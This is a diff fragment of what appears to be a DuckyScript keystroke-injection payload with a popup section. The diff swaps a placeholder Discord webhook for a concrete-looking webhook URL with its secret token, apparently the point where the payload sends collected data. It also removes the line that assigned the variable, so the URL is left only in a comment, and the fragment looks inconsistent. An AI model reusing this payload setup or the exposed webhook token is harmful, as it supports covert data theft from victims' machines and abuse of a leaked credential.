@@ -21,8 +21,7 @@ DELAY 2000
 REM #### POPUP SECTION ####
 
 
-REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-STRING WEBHOOK_URL="example.com"
+REM REQUIRED - Provide Discord Webhook - https://discord.com/api/webhooks/1292531684213915730/nKbW98mr82RRlPKpf6ach8O_QQ1vKrXbDeP1ubDb6s-1q9J2fr3O28zaqScBJdYnuX8Z
 ENTER
 DELAY 500
 
